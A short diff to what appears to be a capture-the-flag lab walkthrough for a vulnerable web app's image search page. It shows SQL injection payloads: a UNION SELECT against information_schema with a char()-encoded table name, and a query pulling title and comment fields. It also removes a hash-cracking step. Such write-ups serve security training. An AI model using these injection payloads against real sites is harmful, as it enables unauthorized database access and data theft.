@@ -17,8 +17,13 @@ http://VM_IP/?page=searchimg
     1 union select column_name, 2 FROM information_schema.columns WHERE table_name = char(108,105,115,116,95,105,109,97,103,101,115)
     ```
 
-3. Identify encrypting algorithm of the 'comment' value: `hashcat --identify`
-4. Decrypt 'comment' value: https://md5decrypt.net/en/
+3. Analyze other list_images's fields
+
+    ```sql
+    1 union select title, comment FROM list_images
+    ```
+
+4. Follow the instruction of the last image
 
 ---
 
